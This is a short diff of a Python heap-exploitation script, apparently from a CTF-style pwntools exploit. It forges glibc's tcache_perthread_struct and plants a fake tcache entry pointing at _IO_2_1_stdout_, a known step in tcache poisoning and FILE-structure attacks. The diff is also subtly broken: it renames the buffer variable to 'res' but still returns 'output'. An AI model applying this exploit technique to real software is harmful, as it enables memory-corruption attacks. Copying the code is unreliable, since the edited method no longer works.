@@ -164,20 +164,20 @@ class TcachePerthreadStruct:
         self.counts = [0]*64
         self.pointers = [0]*64
     def set_count(self, size, count):
-        idx = (size - 0x20) // 16
+        idx = (size-0x20) // 16
         self.counts[idx] = count
     def set_pointer(self, size, pointer):
-        idx = (size - 0x20) // 16
+        idx = (size-0x20) // 16
         self.pointers[idx] = pointer
     def set(self, size, pointer, count=1):
         self.set_pointer(size, pointer)
         self.set_count(size, count)
     def __bytes__(self):
-        output = b""
+        res = b''
         for count in self.counts:
-            output += p16(count)
+            res += p16(count)
         for pointer in self.pointers:
-            output += p64(pointer)
+            res += p64(pointer)
         return output
 fake_tcache = TcachePerthreadStruct()
 fake_tcache.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
